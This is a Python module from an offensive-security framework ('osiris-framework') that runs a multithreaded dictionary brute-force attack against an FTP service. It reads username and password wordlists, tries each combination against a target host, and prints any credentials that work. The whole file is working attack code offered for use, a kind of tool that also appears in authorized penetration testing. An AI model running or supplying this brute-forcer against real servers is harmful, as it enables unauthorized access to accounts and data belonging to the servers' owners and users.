#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 16/11/2022

from core.ModuleObtainer import obtainer
from time import sleep
from ftplib import FTP
import threading
from utilities.Tools import tools
from utilities.Messages import print_message
print_message.name_module = __file__


info = {
        'author'            :'Samir Sanchez Garnica',
        'date'              :'2019/03/10',
        'rank'              :'Excellent',
        'path'              :'auxiliary/scanner/ftp/ftp_login.py',
        'category'          :'auxiliary',
        'license'           :'GPL-2.0',
        'description'       :'module that allows you to perform brute force attack type dictionary on the FTP service and authenticate',
        'references'        :['https://es.wikipedia.org/wiki/Ataque_de_fuerza_bruta']
}
options = {
        'rhost'                 :['Yes', 'use to set rhost',''],
        'rport'                  :['Yes', ' use to set rport','21'],
        'username'               :['No', 'use to set username',''],
        'username_file'          :['No', 'use to set username_file',''],
        'password'               :['No', 'use to set password',''],
        'password_file'          :['No', 'use to set password_file',''],
}

required = {
        'start_required'     :'True',
        'check_required'     :'False'
}


class StopThread(StopIteration):
    pass

threading.SystemExit = SystemExit, StopThread

def ftp_login(__target, __username, __password, __port):
    __ftp = FTP()

    try:
        __ftp.connect(__target, int(__port))
    except Exception as Error:
        pass

    try:
        __ftp.login(user=__username, passwd=__password)
        print_message.execution_credentials_found([__target, __username, __password])
    except Exception as Error:
        print_message.execution_try_credentials([__target, __username, __password])

def exploit():
    """ main exploit function """

    try:
        __threads = []
        __target = obtainer.options['rhost'][2]
        __port = obtainer.options['rport'][2]
        __username = obtainer.options['username'][2]
        __username_file = obtainer.options['username_file'][2]
        __password = obtainer.options['password'][2]
        __password_file = obtainer.options['password_file'][2]


        if len(__target) > 0 and len(__port) > 0:

            try:
                if not isinstance(int(__port), int):
                    print_message.execution_error("The rport parameter must be defined and be integer")
                    return  False
            except:
                print_message.execution_error("The rport parameter must be defined and be integer")
                return False

            __response = tools.check_IPV4(__target)

            if __response['code'] != 200:
                print_message.execution_error(__response['message'])
                return False

            print_message.start_execution()

            if __username_file == "" and __password_file == "":
                try:
                    if ftp_login(__target, __username, __password, __port):
                        print_message.execution_credentials_found([__target, __username, __password])
                except:
                    pass

            elif __username_file == "" and __password_file != "":
                __password_file = tools.read_file(__password_file)
                for __password in __password_file:
                    __thread = threading.Thread(target=ftp_login, args=(__target, __username, __password, __port))
                    __thread.start()
                    __threads.append(__thread)
                    sleep(0.1)

                for __join_thread in __threads:
                    __join_thread.join()

            elif __username_file != "" and __password_file == "":
                __username_file = tools.read_file(__username_file)
                for __username in __username_file:
                    __thread = threading.Thread(target=ftp_login, args=(__target, __username, __password, __port))
                    __thread.start()
                    __threads.append(__thread)
                    sleep(0.1)

                for __join_thread in __threads:
                    __join_thread.join()

            elif __username_file != "" and __password_file != "":
                __username_file = tools.read_file(__username_file)
                __password_file = tools.read_file(__password_file)

                for __password in __password_file:
                    for __username in __username_file:
                        __thread = threading.Thread(target=ftp_login, args=(__target, __username, __password, __port))
                        __thread.start()
                        __threads.append(__thread)
                        sleep(0.1)

                for __join_thread in __threads:
                    __join_thread.join()
            print_message.end_execution()
    except:
        return False



